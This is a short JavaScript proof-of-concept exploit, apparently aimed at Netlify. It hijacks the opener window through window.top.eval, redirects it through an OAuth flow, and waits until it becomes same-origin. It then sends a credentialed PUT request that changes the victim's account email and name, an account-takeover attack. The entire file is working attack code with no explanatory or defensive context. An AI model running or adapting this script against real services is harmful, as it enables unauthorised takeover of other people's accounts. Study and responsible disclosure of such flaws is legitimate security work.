(async () => {
  const oauthUrl = "https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=aade9842-b8db-45b9-92a4-bd807ffdade1&login=true&redirect=https%3A%2F%2Fapp.netlify.com%2Fedge-access%3Fdomain%3Dinternal.netlify.com%26requested_path%3D%252F%26site_id%3D947876e2-b71a-4ce5-88c3-6a4040d6a0b1%26strict_saml%3Dtrue&use_redirect=true";

  if (window.top && !window.top.closed) {
    // Redirect the opener to the OAuth URL
    try {
      window.top.eval(`window.opener.location.href = ${JSON.stringify(oauthUrl)}`);
    } catch (e) {
      console.error("[-] Failed to redirect opener:", e);
    }

    // Wait and then attempt the same-origin fetch
    setTimeout(async () => {
      console.log("[+] Starting same-origin check...");
      const o = window.top.opener;
      let n = 0;

      while (o && !o.closed) {
        try {
          // Accessing location.origin will throw until same-origin
          console.log("[+] Opener is now same-origin:", o.location.origin);
          break;
        } catch {
          if (n++ % 10 === 0) console.log("[.] Still cross-origin...");
        }
        await new Promise(r => setTimeout(r, 100));
      }

      if (!o || o.closed) {
        console.error("[-] Opener closed before operation complete.");
        return;
      }

      const email = new URLSearchParams(location.search).get("email");
      console.log("[+] Email parameter:", email);

      try {
        const res = await o.fetch("https://app.netlify.com/access-control/bb-api/api/v1/user", {
          method: "PUT",
          headers: { "content-type": "application/json" },
          credentials: "include",
          body: JSON.stringify({
            full_name: "hamid hamdad",
            email,
            preferred_account_id: ""
          })
        });

        console.log("[+] Response:", res.status, res.statusText);
        console.log("[+] Body:", await res.clone().text());
      } catch (e) {
        console.error("[-] Fetch failed:", e);
      }
    }, 5000);
  } else {
    window.location.assign(oauthUrl);
  }
})().catch((error) => {
  console.error("Launcher failed:", error);
});
